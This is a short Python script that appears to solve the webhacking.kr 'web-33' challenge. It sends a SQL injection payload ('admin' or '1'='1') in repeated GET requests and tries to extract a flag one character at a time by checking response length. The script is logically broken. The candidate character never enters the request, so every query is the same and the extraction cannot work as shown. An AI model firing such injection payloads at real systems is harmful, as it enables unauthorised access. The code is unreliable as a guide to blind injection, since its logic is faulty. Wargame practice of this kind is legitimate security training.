import requests
import string
import urllib.parse

url = 'https://webhacking.kr/challenge/web-33/'
result = "Flag{himiko_"
while True:
  for i in list(string.ascii_lowercase + string.punctuation.replace("%", "")):
      print(f"Trying {result+i}")
      payload = urllib.parse.quote("admin' or '1'='1&pw=1")
      r = requests.get(url+payload)
      if (len(r.text) > 291):
          result += i
          break
      if (i == '}'):
          print(result)
          exit(0)